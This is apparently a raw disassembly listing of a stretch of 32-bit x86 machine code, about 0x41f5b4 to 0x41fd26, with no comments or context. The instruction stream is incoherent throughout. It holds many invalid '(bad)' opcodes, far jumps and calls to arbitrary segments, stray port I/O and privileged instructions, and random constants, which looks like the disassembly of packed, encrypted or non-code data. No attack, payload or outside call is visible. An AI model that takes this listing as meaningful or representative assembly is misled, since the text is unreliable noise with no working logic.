  41f5b4:	loopne 0x41f600
  41f5b6:	jno    0x41f614
  41f5b8:	inc    ebp
  41f5b9:	adc    al,0xde
  41f5bb:	adc    ebx,DWORD PTR [edi+0x2e806354]
  41f5c1:	es test eax,0x864b24e1
  41f5c7:	or     DWORD PTR [ebp-0x1],0x33b18254
  41f5ce:	or     eax,0x9e252836
  41f5d3:	inc    edi
  41f5d4:	test   BYTE PTR [ecx],dl
  41f5d6:	and    DWORD PTR [ebx+0x69b28f87],esi
  41f5dc:	mov    esi,0xed2b8e8d
  41f5e1:	sbb    BYTE PTR ds:0x4adb1285,ah
  41f5e7:	dec    edi
  41f5e8:	(bad)  
  41f5e9:	sbb    al,0x6
  41f5eb:	mov    DWORD PTR [edi],0xe6c6cb89
  41f5f1:	pop    esi
  41f5f2:	push   eax
  41f5f3:	jo     0x41f635
  41f5f5:	inc    esi
  41f5f6:	cmp    BYTE PTR [esi+edi*8],0x97
  41f5fa:	cwde   
  41f5fb:	adc    al,0x80
  41f5fd:	xor    al,0xbc
  41f5ff:	popa   
  41f600:	mov    bh,0xdc
  41f602:	mov    ah,0x90
  41f604:	xor    eax,0x2be04112
  41f609:	cmp    al,0x9e
  41f60b:	dec    eax
  41f60c:	or     esp,eax
  41f60e:	cwde   
  41f60f:	enter  0xf2e8,0x40
  41f613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f614:	pop    es
  41f615:	les    ecx,FWORD PTR [eax+0x6e]
  41f618:	ja     0x41f5e1
  41f61a:	or     edx,0xc696dbea
  41f620:	retf   
  41f621:	sub    cl,BYTE PTR [ebp+esi*1+0x60d1a97d]
  41f628:	mov    DWORD PTR [esi],ebx
  41f62a:	arpl   bx,bx
  41f62c:	add    eax,0x37b3cfcc
  41f631:	mov    eax,ds:0xe666b9f2
  41f636:	pop    edi
  41f637:	mov    bl,0xe3
  41f639:	jmp    0x41f6aa
  41f63b:	mov    cl,0x95
  41f63d:	in     al,0xc3
  41f63f:	aam    0xe8
  41f641:	stos   BYTE PTR es:[edi],al
  41f642:	(bad)  
  41f643:	div    BYTE PTR [eax+0x26]
  41f646:	sub    esi,eax
  41f648:	cmp    eax,0x883c8df
  41f64d:	xchg   edi,eax
  41f64e:	fs shl ah,cl
  41f651:	push   eax
  41f652:	push   esi
  41f653:	dec    esi
  41f654:	xrstor [ebx+0x38be8f6c]
  41f65b:	pop    esp
  41f65c:	test   al,0x45
  41f65e:	mov    edi,0x210dcb2c
  41f663:	inc    ecx
  41f664:	fcmovnbe st,st(3)
  41f666:	cmp    eax,0xaf880def
  41f66b:	arpl   WORD PTR [esp+ebx*4+0x3f4a08f7],bx
  41f672:	iret   
  41f673:	in     al,0xfb
  41f675:	add    ecx,DWORD PTR [esi]
  41f677:	call   0x19cd:0xb3d5e2db
  41f67e:	inc    ebx
  41f67f:	dec    edx
  41f680:	mov    esi,0x8ad84a18
  41f685:	xchg   edx,eax
  41f686:	cdq    
  41f687:	xor    DWORD PTR [ebp+0x39],eax
  41f68a:	xor    bh,BYTE PTR [eax+0x1e703c3f]
  41f690:	adc    al,0x0
  41f692:	and    BYTE PTR [eax+edx*4-0x524130d8],0x6f
  41f69a:	std    
  41f69b:	mov    dl,0x34
  41f69d:	arpl   WORD PTR [ebp+0x79],sp
  41f6a0:	mov    ah,0x75
  41f6a2:	or     DWORD PTR [ebx],edi
  41f6a4:	pop    es
  41f6a5:	cmp    edx,ecx
  41f6a7:	sub    edi,DWORD PTR [ebx+eiz*4]
  41f6aa:	sub    eax,0x79135935
  41f6af:	je     0x41f65f
  41f6b1:	sbb    esi,DWORD PTR [ecx-0x4c]
  41f6b4:	adc    dh,BYTE PTR [edi+0x3c91d95c]
  41f6ba:	rcl    BYTE PTR [ebx+0x84d966f],0x91
  41f6c1:	clc    
  41f6c2:	ret    
  41f6c3:	in     eax,dx
  41f6c4:	ins    BYTE PTR es:[edi],dx
  41f6c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6c6:	in     al,dx
  41f6c7:	lds    eax,FWORD PTR [eax+0x662dfa6c]
  41f6cd:	nop
  41f6ce:	adc    al,0x32
  41f6d0:	push   edx
  41f6d1:	retf   
  41f6d2:	pop    edi
  41f6d3:	add    dl,ah
  41f6d5:	xchg   ebx,eax
  41f6d6:	ss add al,0x89
  41f6d9:	push   edi
  41f6da:	xchg   ebx,eax
  41f6db:	sti    
  41f6dc:	dec    esi
  41f6dd:	mov    bh,0x47
  41f6df:	dec    ebx
  41f6e0:	out    0x9c,eax
  41f6e2:	int3   
  41f6e3:	mov    bl,0x27
  41f6e5:	xchg   DWORD PTR [edx+0x8bbe459],ecx
  41f6eb:	out    0xe6,eax
  41f6ed:	sti    
  41f6ee:	inc    ebx
  41f6ef:	sti    
  41f6f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6f1:	or     al,0x3f
  41f6f3:	lods   eax,DWORD PTR ds:[esi]
  41f6f4:	sbb    ah,BYTE PTR [edi+0x651ba33f]
  41f6fa:	dec    ecx
  41f6fb:	test   DWORD PTR [edi+0x11a9f8d8],esp
  41f701:	inc    esi
  41f702:	std    
  41f703:	ror    DWORD PTR [esi-0x2e],0x86
  41f707:	out    0xf9,eax
  41f709:	js     0x41f768
  41f70b:	sub    al,0x3f
  41f70d:	imul   ecx,DWORD PTR [eax-0x26],0x4109e65a
  41f714:	push   ecx
  41f715:	or     BYTE PTR [edx+esi*8+0x3ffd969e],bh
  41f71c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f71d:	faddp  st(3),st
  41f71f:	dec    esi
  41f720:	push   ss
  41f721:	fsub   QWORD PTR [ebx-0x1e]
  41f724:	xchg   esp,eax
  41f726:	mov    al,ds:0xe63b9faa
  41f72b:	jmp    0x872b:0xaef7d0e2
  41f732:	add    esi,DWORD PTR [edx+ecx*1-0x14]
  41f736:	shl    eax,cl
  41f738:	ins    BYTE PTR es:[edi],dx
  41f739:	in     eax,dx
  41f73a:	(bad)
  41f73e:	sub    ebp,DWORD PTR [ebx-0x15dc3e36]
  41f744:	xor    al,al
  41f746:	test   al,0x37
  41f748:	jbe    0x41f7ab
  41f74a:	dec    ecx
  41f74b:	popa   
  41f74c:	cmp    bl,BYTE PTR [edx]
  41f74e:	mov    ebx,0xd9a2b11f
  41f753:	imul   esp,DWORD PTR [edi+0x274d7e1b],0x7922b0e4
  41f75d:	pop    es
  41f75e:	vprotw xmm2,xmm5,[esi+0x6a]
  41f764:	(bad)  
  41f765:	aad    0xc2
  41f767:	dec    edi
  41f768:	sti    
  41f769:	loop   0x41f7d2
  41f76b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f76c:	sub    cl,BYTE PTR [ebx+0xdd0d746]
  41f772:	inc    esp
  41f773:	inc    ebx
  41f774:	not    BYTE PTR [edx+edi*8]
  41f777:	retf   0x32d7
  41f77a:	fdiv   st(6),st
  41f77c:	aad    0x3a
  41f77e:	inc    edi
  41f77f:	sbb    al,0x3d
  41f781:	aam    0x26
  41f783:	jmp    0xa7525b70
  41f788:	xchg   ecx,eax
  41f789:	outs   dx,DWORD PTR ds:[esi]
  41f78a:	sbb    esi,0xffffff8f
  41f78d:	test   DWORD PTR [ebx+ebp*4+0x1488b9e7],edi
  41f794:	push   esi
  41f795:	lds    edi,FWORD PTR ds:0x3128deb3
  41f79b:	enter  0xab04,0xa
  41f79f:	cmc    
  41f7a0:	ins    BYTE PTR es:[edi],dx
  41f7a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7a2:	jmp    0x7f28:0x74676f55
  41f7a9:	cdq    
  41f7aa:	inc    esp
  41f7ab:	mov    eax,ds:0x3fb7744e
  41f7b0:	rcr    DWORD PTR [edx+0x625e7df6],0x75
  41f7b7:	xchg   ecx,eax
  41f7b8:	adc    ebx,DWORD PTR [esi+0x25]
  41f7bb:	dec    ebp
  41f7bc:	jno    0x41f756
  41f7be:	jp     0x41f7b2
  41f7c0:	pop    es
  41f7c1:	in     eax,dx
  41f7c2:	loope  0x41f7c4
  41f7c4:	and    bl,BYTE PTR [ebx+eax*4-0x42]
  41f7c8:	(bad)  
  41f7c9:	ret    0x6129
  41f7cc:	inc    edx
  41f7cd:	and    edx,DWORD PTR [esi-0x23]
  41f7d0:	(bad)  
  41f7d1:	(bad)  
  41f7d3:	adc    eax,0x2f9a7438
  41f7d8:	add    DWORD PTR [ebx],0x45352269
  41f7de:	dec    esi
  41f7df:	aas    
  41f7e0:	mov    eax,DWORD PTR [edx+esi*2+0x5e]
  41f7e4:	out    0x12,al
  41f7e6:	in     eax,0xb7
  41f7e8:	in     eax,dx
  41f7e9:	xchg   ebp,eax
  41f7ea:	in     eax,dx
  41f7eb:	dec    ecx
  41f7ec:	mov    edx,esi
  41f7ee:	sahf   
  41f7ef:	pop    eax
  41f7f0:	outs   dx,DWORD PTR ds:[esi]
  41f7f1:	retf   
  41f7f2:	lods   eax,DWORD PTR ds:[esi]
  41f7f3:	jle    0x41f84e
  41f7f5:	inc    ebp
  41f7f6:	mov    BYTE PTR [esi+0x11],bl
  41f7f9:	fimul  WORD PTR [ecx+0x12]
  41f7fc:	in     eax,0xcf
  41f7fe:	dec    ebx
  41f7ff:	adc    al,0xaf
  41f801:	inc    edi
  41f802:	sbb    eax,0x7f58af27
  41f807:	push   edi
  41f808:	rcr    BYTE PTR [esi],1
  41f80a:	shl    BYTE PTR [esi-0x1dd7e1c2],0x8f
  41f811:	cwde   
  41f812:	int3   
  41f813:	jl     0x41f82f
  41f815:	mov    esi,0xb2d36661
  41f81a:	jmp    0x41f7b4
  41f81c:	cmp    esp,esp
  41f81e:	stc    
  41f81f:	hlt    
  41f820:	cs sub eax,0xc1a169e5
  41f826:	mov    dl,dh
  41f828:	adc    ax,0x78cd
  41f82c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f82d:	cmc    
  41f82e:	cmc    
  41f82f:	mov    ah,dl
  41f831:	cld    
  41f832:	inc    edi
  41f833:	and    ah,BYTE PTR [edx-0x5f2e6fd8]
  41f839:	jmp    0x6d512596
  41f83e:	mov    edi,0x3e00dd0e
  41f843:	push   edi
  41f844:	lods   al,BYTE PTR ds:[esi]
  41f845:	aam    0x69
  41f847:	std    
  41f848:	sar    ch,1
  41f84a:	cmp    DWORD PTR [eax-0x11072cba],edx
  41f850:	sub    ebx,DWORD PTR [eax+0x4e]
  41f853:	jbe    0x41f84e
  41f855:	add    al,0xc5
  41f857:	sti    
  41f858:	(bad)  
  41f859:	xor    al,0xd
  41f85b:	pop    esp
  41f85c:	mov    bl,0x1a
  41f85e:	fidivr WORD PTR [eax]
  41f860:	cmp    DWORD PTR ds:0x6f19c900,ecx
  41f866:	sub    esp,DWORD PTR [ecx-0x3d]
  41f869:	ja     0x41f812
  41f86b:	mov    bh,ch
  41f86d:	repz adc eax,DWORD PTR [edi-0x6c3b1905]
  41f874:	mov    esi,ds
  41f876:	cmp    bl,BYTE PTR [edx-0x4cf38dde]
  41f87c:	cmp    al,0x5f
  41f87e:	mov    esp,0xc5292d7f
  41f883:	add    eax,0xfd06fd49
  41f888:	cwde   
  41f889:	mov    ebp,0x1c790442
  41f88e:	pop    ebx
  41f88f:	mov    ah,0x74
  41f891:	popa   
  41f892:	add    al,bh
  41f894:	sahf   
  41f895:	cs fcomip st,st(5)
  41f898:	in     al,dx
  41f899:	dec    edx
  41f89a:	xchg   ecx,eax
  41f89b:	push   ds
  41f89c:	imul   ebx,DWORD PTR ds:0x812c046d,0x5d
  41f8a3:	xchg   BYTE PTR [ebx+eiz*2-0x5f],cl
  41f8a7:	out    dx,eax
  41f8a8:	cld    
  41f8a9:	enter  0x9ffc,0xcd
  41f8ad:	push   ebx
  41f8ae:	jg     0x41f927
  41f8b0:	cli    
  41f8b1:	adc    eax,DWORD PTR [eax+ecx*2-0x4cc46a7e]
  41f8b8:	mov    DWORD PTR [eax],ecx
  41f8ba:	cmc    
  41f8bb:	cld    
  41f8bc:	rep ins DWORD PTR es:[edi],dx
  41f8be:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41f8c0:	in     eax,0xbd
  41f8c2:	ins    BYTE PTR es:[edi],dx
  41f8c3:	pop    edi
  41f8c4:	fisttp DWORD PTR [ecx-0x25ae2e46]
  41f8ca:	stos   BYTE PTR es:[edi],al
  41f8cb:	(bad)  
  41f8cc:	mov    ds,WORD PTR [esi-0x1082a0e3]
  41f8d2:	daa    
  41f8d3:	and    BYTE PTR [ebp-0x3a439306],bl
  41f8d9:	(bad)  
  41f8da:	lods   al,BYTE PTR ds:[esi]
  41f8db:	lds    eax,FWORD PTR [esp+ebp*8]
  41f8de:	pop    ds
  41f8df:	mov    esi,ebp
  41f8e1:	sbb    eax,0x1b6c26df
  41f8e6:	out    0xb7,al
  41f8e8:	mov    edi,0x7de21e99
  41f8ed:	sub    ch,0xac
  41f8f0:	(bad)  
  41f8f1:	gs fcmove st,st(0)
  41f8f4:	int    0xca
  41f8f6:	gs jg  0x41f951
  41f8f9:	sub    DWORD PTR [edi],eax
  41f8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8fc:	fidivr DWORD PTR [eax]
  41f8fe:	xor    al,0xda
  41f900:	fldcw  WORD PTR [edx+0x10]
  41f903:	imul   esp,DWORD PTR [edi+0x5c],0xa6da93fb
  41f90a:	xor    BYTE PTR [edi+edx*4-0x16530432],al
  41f911:	(bad)  
  41f912:	or     bl,BYTE PTR [eax+0x30]
  41f915:	push   cs
  41f916:	mov    DWORD PTR [ecx],esi
  41f918:	call   0xa2e61b6a
  41f91d:	cmp    al,0x5e
  41f91f:	push   ecx
  41f920:	popf   
  41f921:	jno    0x41f91f
  41f923:	sbb    DWORD PTR [ecx-0x78679e73],ebx
  41f929:	xchg   DWORD PTR [esi-0x39af7096],ebx
  41f92f:	mov    BYTE PTR [eax],dh
  41f931:	bound  esi,QWORD PTR [eax-0x7d]
  41f934:	push   ebp
  41f935:	add    BYTE PTR [esi-0x5261f605],ah
  41f93b:	xchg   cl,cl
  41f93d:	inc    eax
  41f93e:	mov    eax,ds:0x27230f1
  41f943:	hlt    
  41f944:	in     eax,dx
  41f945:	xlat   BYTE PTR ds:[ebx]
  41f946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f947:	lods   eax,DWORD PTR ds:[esi]
  41f948:	fidivr DWORD PTR [ebx-0x4d0c0ad]
  41f94e:	mov    bl,0xe4
  41f950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f951:	and    eax,0xd610f89f
  41f956:	adc    DWORD PTR [ebp+0x14ea4529],edx
  41f95c:	outs   dx,DWORD PTR ds:[esi]
  41f95d:	mov    ds:0x9f31b6ee,al
  41f962:	add    cl,BYTE PTR ds:0x69d0f7c4
  41f968:	mov    BYTE PTR [esi-0x500e5ff7],cl
  41f96e:	fisttp QWORD PTR [esi+esi*1-0x1b6762b9]
  41f975:	fsub   DWORD PTR [edi]
  41f977:	arpl   WORD PTR [ebx],dx
  41f979:	add    eax,0xe2891296
  41f97e:	push   ebp
  41f97f:	mov    esp,0x3bc137d0
  41f984:	pop    ebx
  41f985:	mov    al,ds:0x5d9b26f5
  41f98a:	dec    edi
  41f98b:	ds inc ebx
  41f98d:	sub    al,0x36
  41f98f:	or     cl,bh
  41f991:	into   
  41f992:	lea    esp,ds:0xc79b631a
  41f998:	in     eax,0x5f
  41f99a:	cmp    eax,0x607ff414
  41f99f:	out    0x4e,al
  41f9a1:	out    0x53,eax
  41f9a3:	xor    dl,BYTE PTR [edi+0x11]
  41f9a6:	push   edx
  41f9a7:	jbe    0x41f94c
  41f9a9:	sbb    dl,BYTE PTR [esi-0x1dc099a1]
  41f9af:	jg     0x41f998
  41f9b1:	mov    eax,0xbc653c11
  41f9b6:	adc    eax,0x98bd462d
  41f9bb:	ins    BYTE PTR es:[edi],dx
  41f9bc:	xchg   edi,eax
  41f9bd:	mov    WORD PTR [edx],cs
  41f9bf:	(bad)  
  41f9c0:	test   WORD PTR [edi],0xbf7e
  41f9c5:	push   esp
  41f9c6:	stos   DWORD PTR es:[edi],eax
  41f9c7:	retf   0x2209
  41f9ca:	and    BYTE PTR [edi],al
  41f9cc:	jmp    0x41fa1c
  41f9ce:	div    edi
  41f9d0:	add    BYTE PTR [esi+0x2c931bb5],ch
  41f9d6:	ins    DWORD PTR es:[edi],dx
  41f9d7:	pop    esi
  41f9d8:	jecxz  0x41f980
  41f9da:	dec    eax
  41f9db:	dec    ebx
  41f9dc:	bnd ja 0x41f9a1
  41f9df:	shl    BYTE PTR [ebx-0x6c44b6a0],cl
  41f9e5:	mov    ebx,0xcf2c840f
  41f9ea:	arpl   WORD PTR [ecx-0x35],sp
  41f9ed:	loopne 0x41f9ad
  41f9ef:	mov    ah,0x7e
  41f9f1:	out    0x5,eax
  41f9f3:	arpl   WORD PTR [esi],ax
  41f9f5:	pusha  
  41f9f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9f7:	(bad)  
  41f9f8:	pusha  
  41f9f9:	call   0x5ec39ea5
  41f9fe:	jns    0x41fa2a
  41fa00:	loopne 0x41f992
  41fa02:	popf   
  41fa03:	pop    esi
  41fa04:	xchg   edi,eax
  41fa05:	and    esi,DWORD PTR [ecx]
  41fa07:	fnsave [edi-0x35]
  41fa0a:	ret    0x1d73
  41fa0d:	scas   eax,DWORD PTR es:[edi]
  41fa0e:	stc    
  41fa0f:	int3   
  41fa10:	mov    WORD PTR [eax-0x7f001df3],ds
  41fa16:	cld    
  41fa17:	neg    BYTE PTR [eax-0x3347b33f]
  41fa1d:	sbb    al,0x3b
  41fa1f:	inc    edi
  41fa20:	repnz rol BYTE PTR [ecx-0x69],1
  41fa24:	aas    
  41fa25:	cs dec esi
  41fa27:	jle    0x41fa21
  41fa29:	rcl    BYTE PTR [ebp+0x28e638a5],1
  41fa2f:	fstp   st(0)
  41fa31:	mul    BYTE PTR [ecx-0x3a]
  41fa34:	jns    0x41fa27
  41fa36:	ffree  st(4)
  41fa38:	mov    bl,BYTE PTR [ecx+0xf]
  41fa3b:	push   ebp
  41fa3c:	xchg   esi,eax
  41fa3d:	test   DWORD PTR [edx-0x40ab0d82],ebp
  41fa43:	xor    eax,0xe16ab26
  41fa48:	adc    al,BYTE PTR [eax+0x6252d998]
  41fa4e:	rcr    DWORD PTR [ebx-0x73e1380c],0xd4
  41fa55:	ins    BYTE PTR es:[edi],dx
  41fa56:	test   cl,dl
  41fa58:	cli    
  41fa59:	stc    
  41fa5a:	fmul   QWORD PTR es:[esp+ecx*2+0x38c7b502]
  41fa62:	js     0x41fa41
  41fa64:	inc    esi
  41fa65:	dec    ebp
  41fa66:	add    edi,ebp
  41fa68:	push   es
  41fa69:	scas   eax,DWORD PTR es:[edi]
  41fa6a:	inc    edi
  41fa6b:	xchg   bl,dl
  41fa6d:	xor    BYTE PTR [esi],ah
  41fa6f:	mov    ebx,0x95313fc7
  41fa74:	jne    0x41fa19
  41fa76:	pop    edi
  41fa77:	push   ecx
  41fa78:	jnp    0x41fabc
  41fa7a:	cld    
  41fa7b:	aad    0xea
  41fa7d:	and    esp,DWORD PTR [eax]
  41fa7f:	stos   BYTE PTR es:[edi],al
  41fa80:	cmp    al,0x9d
  41fa82:	jg     0x41fabc
  41fa84:	popa   
  41fa85:	sbb    al,0x9c
  41fa87:	cmp    BYTE PTR [esi+0x52],dh
  41fa8a:	mov    ecx,0xffae6e60
  41fa8f:	icebp  
  41fa90:	leave  
  41fa91:	shl    dh,0xbd
  41fa94:	mov    al,0xf2
  41fa96:	fmul   QWORD PTR [ebp+0x586e13b7]
  41fa9c:	and    eax,0x45c4dbd3
  41faa1:	les    ebp,FWORD PTR [ecx]
  41faa3:	std    
  41faa4:	mov    esp,0x65879b92
  41faa9:	cmp    DWORD PTR [edx+0x59e4a72b],esp
  41faaf:	ret    0x279f
  41fab2:	jno    0x41fb33
  41fab4:	pop    ecx
  41fab5:	mov    bh,BYTE PTR [eax-0x7d]
  41fab8:	ret    0x568d
  41fabb:	xchg   esp,eax
  41fabc:	inc    esi
  41fabd:	xchg   edi,eax
  41fabe:	sub    BYTE PTR [ebx+edi*8-0x785517b8],0x27
  41fac6:	dec    esi
  41fac7:	(bad)  
  41fac8:	mov    esi,0x2c376797
  41facd:	pop    esp
  41face:	mov    ecx,0x646e7e2c
  41fad3:	sbb    esp,DWORD PTR [esi+0x174c9d87]
  41fad9:	mov    ebx,0x15fd13c
  41fade:	(bad)  
  41fadf:	dec    esp
  41fae0:	push   esp
  41fae1:	xor    ah,BYTE PTR [eax-0x35a20fba]
  41fae7:	mov    ecx,fs
  41fae9:	je     0x41fb30
  41faeb:	aas    
  41faec:	cdq    
  41faed:	lds    edi,FWORD PTR [ebp+0x396c2e95]
  41faf3:	lods   al,BYTE PTR ds:[esi]
  41faf4:	pop    esp
  41faf5:	ss and al,0x15
  41faf8:	ja     0x41fb60
  41fafa:	xchg   ebx,eax
  41fafb:	rcr    DWORD PTR [eax+0xe],1
  41fafe:	retf   0xe8d
  41fb01:	and    BYTE PTR [edx+0xd],dh
  41fb04:	pop    es
  41fb05:	cmp    DWORD PTR [edi-0x423f3e95],esp
  41fb0b:	jp     0x41fb42
  41fb0d:	adc    al,0x2b
  41fb0f:	out    dx,al
  41fb10:	sub    al,cl
  41fb12:	in     al,dx
  41fb13:	or     DWORD PTR [eax],edi
  41fb15:	shl    DWORD PTR [eax],cl
  41fb17:	retf   
  41fb18:	mov    ecx,0x4f6d5731
  41fb1d:	push   edx
  41fb1e:	and    al,0x4f
  41fb20:	outs   dx,DWORD PTR ds:[esi]
  41fb21:	test   eax,0xead74ae3
  41fb26:	arpl   bp,bp
  41fb28:	nop
  41fb29:	xchg   edx,eax
  41fb2a:	cmp    edi,DWORD PTR [edi+0x24]
  41fb2d:	fwait
  41fb2e:	push   eax
  41fb2f:	jp     0x41fb8b
  41fb31:	dec    ecx
  41fb32:	xor    BYTE PTR [eax],ah
  41fb34:	and    dl,BYTE PTR [edi]
  41fb36:	push   0xfffffffe
  41fb38:	mov    al,0xb7
  41fb3a:	lods   al,BYTE PTR ds:[esi]
  41fb3b:	inc    edi
  41fb3c:	aas    
  41fb3d:	adc    BYTE PTR [esi+0x2192f42e],0x8a
  41fb44:	in     al,0xa1
  41fb46:	jae    0x41fb8c
  41fb48:	jne    0x41fb14
  41fb4a:	push   eax
  41fb4b:	and    DWORD PTR [esp+ebp*2],0x515d61cd
  41fb52:	inc    ebp
  41fb53:	mov    ebx,0x465ce8fe
  41fb58:	jbe    0x41fb30
  41fb5a:	pop    esi
  41fb5b:	mov    eax,ds:0x53b64ea0
  41fb60:	cmp    cl,dh
  41fb62:	lods   al,BYTE PTR ds:[esi]
  41fb63:	shr    edx,1
  41fb65:	dec    esi
  41fb66:	ds xchg dl,ch
  41fb69:	xor    BYTE PTR [edi-0x7380e5c4],0x4e
  41fb70:	in     eax,0x9b
  41fb72:	xor    DWORD PTR [eax-0x2a1a9add],ebx
  41fb78:	sub    eax,0x32055862
  41fb7d:	cwde   
  41fb7e:	aaa    
  41fb7f:	sub    BYTE PTR [ebp+0x66a7d6da],ch
  41fb85:	movlhps xmm3,xmm2
  41fb88:	cmp    ah,0x93
  41fb8b:	inc    esp
  41fb8c:	rcl    DWORD PTR [ebx+0x42],cl
  41fb8f:	lods   eax,DWORD PTR ds:[esi]
  41fb90:	stos   BYTE PTR es:[edi],al
  41fb91:	cdq    
  41fb92:	repnz cs sub al,0xfe
  41fb96:	loope  0x41fc17
  41fb98:	aas    
  41fb99:	loop   0x41fb69
  41fb9b:	stos   BYTE PTR es:[edi],al
  41fb9c:	fmul   st,st(6)
  41fb9e:	mov    ss:0x1679de9e,eax
  41fba4:	fidiv  WORD PTR [edi+0x3a1e1bc7]
  41fbaa:	mov    ecx,0x9f274bf7
  41fbaf:	fnstenv ds:0xb41b88e5
  41fbb5:	inc    ecx
  41fbb6:	mov    bh,0x93
  41fbb8:	imul   edx,DWORD PTR [edi-0x44313b4],0x36
  41fbbf:	mov    dh,0xf4
  41fbc1:	xchg   edx,eax
  41fbc2:	jo     0x41fba2
  41fbc4:	call   0xb5faed60
  41fbc9:	and    ebx,eax
  41fbcb:	mov    ds:0x9b54e599,eax
  41fbd0:	sbb    edx,DWORD PTR [ebx]
  41fbd2:	aas    
  41fbd3:	adc    ch,BYTE PTR [eax]
  41fbd5:	into   
  41fbd6:	aas    
  41fbd7:	push   0x5e
  41fbd9:	pop    DWORD PTR [edi-0x1181d837]
  41fbdf:	int    0x65
  41fbe1:	js     0x41fc28
  41fbe3:	sahf   
  41fbe4:	jae    0x41fb6e
  41fbe6:	rcl    dl,1
  41fbe8:	data16 or BYTE PTR [ecx],dl
  41fbeb:	dec    eax
  41fbec:	dec    ebx
  41fbed:	hlt    
  41fbee:	inc    ebp
  41fbef:	jnp    0x41fbeb
  41fbf1:	pop    ebx
  41fbf2:	iret   
  41fbf3:	(bad)  
  41fbf4:	loope  0x41fbf9
  41fbf6:	adc    eax,DWORD PTR [ebx-0x2ff68f76]
  41fbfc:	cld    
  41fbfd:	adc    eax,0x257c31cd
  41fc02:	dec    ecx
  41fc03:	out    dx,al
  41fc04:	ror    DWORD PTR ss:[ebx+0x2f],cl
  41fc08:	push   ebx
  41fc0a:	jb     0x41fc40
  41fc0c:	push   ebp
  41fc0d:	std    
  41fc0e:	push   ebp
  41fc0f:	lds    ecx,FWORD PTR [esi]
  41fc11:	cwde   
  41fc12:	pop    edx
  41fc13:	(bad)  
  41fc14:	push   ebx
  41fc15:	in     al,0x39
  41fc17:	dec    BYTE PTR [edi-0x52de8353]
  41fc1d:	(bad)  
  41fc1e:	enter  0x8ce8,0x50
  41fc22:	out    dx,eax
  41fc23:	sub    esi,DWORD PTR [esi-0x29]
  41fc26:	xchg   edi,eax
  41fc27:	mov    bl,0x7a
  41fc29:	scas   eax,DWORD PTR es:[edi]
  41fc2a:	lea    edi,ds:0x4e650724
  41fc30:	jp     0x41fbfe
  41fc32:	lahf   
  41fc33:	mov    BYTE PTR [edx-0x357323b1],bl
  41fc39:	jnp    0x41fc0c
  41fc3b:	mov    edi,DWORD PTR [edx+0xa]
  41fc3e:	jbe    0x41fc96
  41fc40:	addr16 xor al,0x32
  41fc43:	dec    edi
  41fc44:	or     esp,DWORD PTR [edi]
  41fc46:	mov    BYTE PTR [esi-0xe3bb56],al
  41fc4c:	pop    es
  41fc4d:	psllw  mm4,QWORD PTR [eax+eiz*2]
  41fc51:	ss rcl dh,0x45
  41fc55:	add    eax,0x58adbce1
  41fc5a:	push   eax
  41fc5b:	jmp    0x29a8:0xa01110fe
  41fc62:	mov    ?,WORD PTR [eax]
  41fc64:	dec    ebp
  41fc65:	jp     0x41fc1b
  41fc67:	in     al,dx
  41fc68:	jns    0x41fcbb
  41fc6a:	adc    BYTE PTR [ebx+0x6dfdda38],al
  41fc70:	sahf   
  41fc71:	lods   eax,DWORD PTR ds:[esi]
  41fc72:	loope  0x41fc4d
  41fc74:	lods   eax,DWORD PTR ds:[esi]
  41fc75:	rcr    BYTE PTR [esi+edx*4],1
  41fc78:	nop
  41fc79:	enter  0x56ed,0x76
  41fc7d:	or     DWORD PTR [ecx+edi*8-0x828a8d],eax
  41fc84:	pop    es
  41fc85:	into   
  41fc86:	add    eax,0x22987777
  41fc8b:	jb     0x41fc14
  41fc8d:	push   ebx
  41fc8e:	pop    edx
  41fc8f:	xchg   ecx,eax
  41fc90:	xchg   esp,eax
  41fc91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc92:	repnz dec edi
  41fc94:	dec    ebp
  41fc95:	inc    esi
  41fc96:	outs   dx,BYTE PTR ds:[esi]
  41fc97:	pop    edi
  41fc98:	mov    eax,ds:0x12a4d3b7
  41fc9d:	jle    0x41fc98
  41fc9f:	cmp    eax,0x24d08fee
  41fca4:	pop    eax
  41fca5:	adc    eax,0x33ebecc9
  41fcaa:	shl    BYTE PTR [ebx],0x6e
  41fcad:	jnp    0x41fd1a
  41fcaf:	call   0x76a24ed1
  41fcb4:	in     eax,0x4c
  41fcb6:	mov    ah,0x39
  41fcb8:	inc    ecx
  41fcb9:	les    ebp,FWORD PTR [eax]
  41fcbb:	imul   esi,DWORD PTR [edi-0x716a781a],0x34
  41fcc2:	push   esp
  41fcc3:	jmp    0x1dea5fdb
  41fcc8:	mov    ds:0x4a948ab5,eax
  41fccd:	sgdtd  ds:0xc85e7c0
  41fcd4:	cmp    cl,BYTE PTR [esi+0x5]
  41fcd7:	out    0x90,eax
  41fcd9:	and    esi,DWORD PTR ss:[esp+edi*1]
  41fcdd:	test   edx,0x4b67f865
  41fce3:	fimul  DWORD PTR [ebp+0x6fc936ee]
  41fce9:	sbb    DWORD PTR [eax+0x3d34b1f0],edi
  41fcef:	aad    0xf9
  41fcf1:	xchg   ebx,eax
  41fcf2:	sub    eax,0x2af28e09
  41fcf7:	sbb    esi,edi
  41fcf9:	in     eax,0x3f
  41fcfb:	xor    al,0xce
  41fcfd:	cmp    dh,ch
  41fcff:	(bad)  
  41fd00:	aad    0x1a
  41fd02:	push   edx
  41fd03:	sub    eax,0x7624ff23
  41fd08:	es leave 
  41fd0a:	cmp    al,0xee
  41fd0c:	xchg   edi,eax
  41fd0d:	gs cmp eax,0x6fedf1ed
  41fd13:	aad    0x37
  41fd15:	cwde   
  41fd16:	sti    
  41fd17:	mov    DWORD PTR [eax+0x69632cbe],ebx
  41fd1d:	and    ah,BYTE PTR [eax+0x276f3b88]
  41fd23:	jge    0x41fd27
  41fd25:	lods   al,BYTE PTR ds:[esi]
  41fd26:	dec    ebx
